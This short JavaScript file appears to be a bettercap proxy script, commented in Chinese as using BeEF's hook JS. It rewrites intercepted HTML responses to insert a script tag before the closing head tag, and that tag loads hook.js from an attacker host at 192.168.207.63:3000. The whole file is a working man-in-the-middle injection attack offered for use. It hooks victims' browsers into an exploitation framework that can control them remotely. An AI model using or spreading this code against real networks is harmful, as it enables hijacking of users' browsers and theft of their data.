// 使用beef的hook js
function onLoad() {
  log("Script loaded!");
}

function onResponse(req, res) {
    if( res.ContentType.indexOf('text/html') == 0 ){
        var body = res.ReadBody();
        if( body.indexOf('</head>') != -1 ) {
            res.Body = body.replace( 
                '</head>', 
                '<script src="http://192.168.207.63:3000/hook.js"></script>' +
                '</head>'
            ); 
        }
    }
}
